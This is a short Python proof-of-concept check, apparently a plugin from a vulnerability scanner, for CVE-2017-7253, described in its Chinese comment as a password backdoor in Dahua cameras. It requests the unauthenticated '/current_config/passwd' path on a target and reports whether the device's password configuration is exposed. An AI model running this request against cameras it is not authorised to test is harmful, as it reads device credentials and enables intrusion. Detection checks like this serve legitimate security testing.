import requests
from plugin.target_parse import get_standard_url

# CVE-2017-7253 大华摄像头密码后门

def poc(url):
    url = get_standard_url(url)
    try:
        r = requests.get(f"{url}/current_config/passwd", timeout=10)
        if r.status_code == 200 and "name:passwd" in r.text:
            return True
    except:
        pass
    return False
